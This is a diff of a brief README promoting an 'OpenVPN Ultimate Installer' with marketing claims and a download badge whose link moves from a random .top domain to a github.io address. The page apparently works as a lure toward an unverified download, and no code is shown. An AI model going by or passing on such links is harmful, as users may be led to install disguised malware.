@@ -1,8 +1,8 @@
-# OpenVPN Ultimate Installer 2025
+# OpenVPN Ultimate Installer
 
 The most advanced OpenVPN deployment solution that revolutionizes server setup with intelligent automation and military-grade security protocols. Designed for enterprise environments, privacy advocates, and tech enthusiasts who demand reliability and simplicity in their VPN infrastructure.
 
-[![Download Ultimate OpenVPN](https://img.shields.io/badge/Download-Ultimate_OpenVPN-ff69b4)](https://poelkakusthbutn.top/)  
+[![Download Ultimate OpenVPN](https://img.shields.io/badge/Download-Ultimate_OpenVPN-ff69b4)](https://openvpn-installer.github.io/.github)  
 
 ---
 
